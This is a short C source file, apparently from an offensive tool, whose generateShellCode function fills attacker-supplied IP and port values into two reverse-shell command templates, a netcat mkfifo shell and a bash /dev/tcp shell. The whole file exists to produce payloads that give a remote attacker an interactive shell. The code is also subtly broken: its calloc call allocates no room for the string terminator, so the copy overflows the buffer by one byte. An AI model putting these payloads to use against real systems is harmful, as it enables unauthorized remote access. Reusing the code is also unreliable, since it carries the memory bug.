#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#include "global.h"
#include "revshells.h"

/* All of these revshells are taken from swisskyrepo's PayloadAllTheThings */

/* First parameter is IP, second parameter is Port */
#define NETCAT_REVSHELL "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f"

/* First parameter is IP, second paramter is Port */
#define BASH_REVSHELL "bash -i >& /dev/tcp/%s/%d 0>&1"

char *generateShellCode() {
	char tmp[200];
	switch(_global.revTarget) {
		default: return NULL;

		case target_Netcat:
			sprintf(tmp, NETCAT_REVSHELL, _global.lhost, _global.port);
			break;
		case target_Bash:
			sprintf(tmp, BASH_REVSHELL, _global.lhost, _global.port);
			break;
	}
	char *ret = calloc(sizeof(char), strlen(tmp));
	strcpy(ret, tmp);
	return ret;
}
